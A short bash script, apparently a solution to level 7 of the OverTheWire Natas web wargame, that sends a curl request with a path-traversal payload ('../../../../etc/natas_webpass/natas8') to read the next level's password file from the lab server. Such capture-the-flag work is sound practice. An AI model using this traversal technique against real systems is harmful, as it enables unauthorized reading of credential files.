#!/bin/bash

BASIC=$(./natas6.sh)

PASSWORD=$(curl --user $BASIC --data "secret=$SECRET&submit=" http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8 2>/dev/null | grep br -A1 | tail -1)

echo "natas8:$PASSWORD"
